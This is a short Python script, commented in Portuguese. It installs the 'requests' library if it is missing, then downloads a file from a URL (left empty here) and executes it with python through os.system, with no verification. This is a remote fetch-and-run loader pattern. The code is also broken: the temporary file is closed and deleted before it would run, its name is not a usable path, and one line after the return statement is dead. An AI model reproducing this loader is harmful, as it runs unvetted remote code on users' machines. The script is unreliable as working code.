import os
import tempfile
def restart_program():
    os.system(f"python \"{__file__}\"")
    quit()
try:
    import requests
except:
    print("\nINSTALANDO BIBLIOTECA NECESSÁRIA, AGUARDE!\n(CONEXÃO COM INTERNET NECESSÁRIA)")
    os.system("pip install requests")
    restart_program()
def baixa_arquivo_temp(url):
    dados = requests.get(url)#faz download do arquivo
    temparquivo = tempfile.TemporaryFile()
    temparquivo.write(dados.content)
    temparquivo.close()
    return temparquivo.name
    os.system(f"python {temparquivo.name}")

def main():
    programa = baixa_arquivo_temp("")
    os.system(f"python {programa}")
    quit()

if __name__ == "__main__":
    main()
